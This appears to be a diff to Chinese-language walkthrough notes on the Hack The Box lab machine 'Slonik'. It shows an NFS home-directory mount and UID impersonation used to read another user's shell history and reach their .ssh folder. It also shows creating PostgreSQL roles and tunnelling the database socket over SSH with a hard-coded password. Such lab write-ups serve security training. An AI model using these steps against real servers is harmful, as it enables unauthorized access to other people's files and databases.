@@ -1,4 +1,66 @@
 ## Slonik
+### 总结
+```
+[★]$ mkdir /tmp/nfs
+[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
+[★]$ ls -la /tmp/nfs
+total 20
+drwxr-xr-x  3 root root  4096 Oct 24  2023 .
+drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
+drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
+[★]$ cd /tmp/nfs
+[★]$ sudo useradd service -u 1337
+[★]$ sudo su service
+sh: 1: [[: not found
+\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
+service@htb-xybs8a7uq9:/tmp/nfs$ ls -la 
+total 20
+drwxr-xr-x  3 root    root     4096 Oct 24  2023 .
+drwxrwxrwt 20 root    root    12288 Mar  9 07:12 ..
+drwxr-x---  5 service service  4096 Sep 22 07:46 service
+service@htb-xybs8a7uq9:/tmp/nfs$ ls -la service/
+total 40
+drwxr-x--- 5 service service 4096 Sep 22 07:46 .
+drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
+-rw-r--r-- 1 service service   90 Sep 22 07:46 .bash_history
+-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
+-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
+drwx------ 2 service service 4096 Oct 24  2023 .cache
+drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
+-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
+-rw-r--r-- 1 service service  326 Sep 22 07:46 .psql_history
+drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
+service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history
+ls -lah /var/run/postgresql/
+file /var/run/postgresql/.s.PGSQL.5432
+psql -U postgres
+exit
+service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
+/etc/postgresql/15/main/postgresql.conf
+service@htb-xybs8a7uq9:/tmp/nfs$ cd ../../etc/postgresql/15/main/
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ ls -la
+total 68
+drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 .
+drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 ..
+drwxr-xr-x 2 postgres postgres  4096 Oct  7  2024 conf.d
+-rw-r--r-- 1 postgres postgres   315 Oct  7  2024 environment
+-rw-r--r-- 1 postgres postgres   143 Oct  7  2024 pg_ctl.conf
+-rw-r----- 1 postgres postgres  5002 Oct  7  2024 pg_hba.conf
+-rw-r----- 1 postgres postgres  1636 Oct  7  2024 pg_ident.conf
+-rw-r--r-- 1 postgres postgres 29709 Oct  7  2024 postgresql.conf
+-rw-r--r-- 1 postgres postgres   317 Oct  7  2024 start.conf
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi postgresql.conf
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi pg_hba.conf
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo systemctl restart postgresql
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ systemctl status postgresql
+● postgresql.service - PostgreSQL RDBMS
+     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
+     Active: active (exited) since Mon 2026-03-09 07:25:43 CDT; 19s ago
+    Process: 27073 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+   Main PID: 27073 (code=exited, status=0/SUCCESS)
+        CPU: 1ms
+service@htb-xybs8a7uq9:/etc/postgresql/15/main$ 
+```
 ```
 [★]$ nmap -sV -sC 10.129.234.160
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:19 CDT
@@ -123,7 +185,7 @@ drwxr-xr-x  3 root root  4096 Oct 24  2023 .
 drwxrwxrwt 21 root root 12288 Mar  9 01:29 ..
 drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
 
-
+[★]$ cd /tmp/nfs
 [★]$ sudo useradd service -u 1337
 [★]$ sudo su service
 sh: 1: [[: not found
@@ -314,3 +376,53 @@ postgres=# \l List of databases
  (3 rows)
 ```
 #### 可惜没有看到service
+#### 先创建了service用户
+```
+[★]$ psql -h 127.0.0.1 -p 5432 -U postgres
+psql (15.14 (Debian 15.14-0+deb12u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type "help" for help.
+
+postgres=# \du
+                                   List of roles
+ Role name |                         Attributes                         | Member of 
+-----------+------------------------------------------------------------+-----------
+ postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
+
+postgres=# \l
+postgres=# 
+postgres=# \c service
+connection to server at "127.0.0.1", port 5432 failed: FATAL:  database "service" does not exist
+Previous connection kept
+postgres=# CREATE DATABASE service OWNER service;
+ERROR:  role "service" does not exist
+postgres=# CREATE ROLE service WITH LOGIN PASSWORD 'service';
+CREATE ROLE
+postgres=# \du
+                                   List of roles
+ Role name |                         Attributes                         | Member of 
+-----------+------------------------------------------------------------+-----------
+ postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
+ service   |                                                            | {}
+
+postgres=#
+```
+#### 再创建service数据库
+```
+postgres=# CREATE DATABASE service OWNER service;
+CREATE DATABASE
+postgres=# \c service
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+You are now connected to database "service" as user "postgres".
+```
+#### 看到了SSL没有关闭，修改文件
+```
+service@htb-xybs8a7uq9:/tmp/nfs$ sudo vi /etc/postgresql/15/main/postgresql.conf
+ssl = on
+改成：
+ssl = off
+service@htb-xybs8a7uq9:/tmp/nfs$ sudo systemctl restart postgresql
+
+ervice@htb-xybs8a7uq9:/tmp/nfs$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
+
+```
